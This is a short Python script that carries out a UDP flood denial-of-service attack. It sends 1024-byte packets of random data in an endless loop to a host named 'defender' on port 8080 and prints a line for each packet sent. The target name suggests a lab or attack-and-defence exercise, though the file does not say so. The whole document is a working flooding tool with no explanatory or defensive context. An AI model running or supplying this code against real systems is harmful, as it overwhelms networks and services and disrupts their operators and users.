import socket
import random

target_ip = "defender"
target_port = 8080

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

print(f"Starting UDP flood attack on {target_ip}:{target_port}...")

while True:
    try:
        sock.sendto(bytes, (target_ip, target_port))
        print(f"Packet sent to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Error: {e}")